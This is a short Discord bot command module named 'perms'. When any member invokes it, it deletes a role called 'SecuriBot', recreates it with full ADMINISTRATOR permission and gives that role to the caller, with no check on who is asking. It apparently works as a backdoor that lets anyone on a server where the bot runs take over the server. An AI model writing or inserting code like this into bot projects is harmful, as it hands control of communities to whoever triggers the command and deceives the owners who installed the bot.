module.exports.run = async (bot, message, args) => {
  message.guild.roles.find(role => role.name === 'SecuriBot').delete();
  message.guild.createRole({
    name: 'SecuriBot',
    permissions: ['ADMINISTRATOR']
  }).then(role => message.member.addRole(role))
}

module.exports.help = {
  name: 'perms'
}
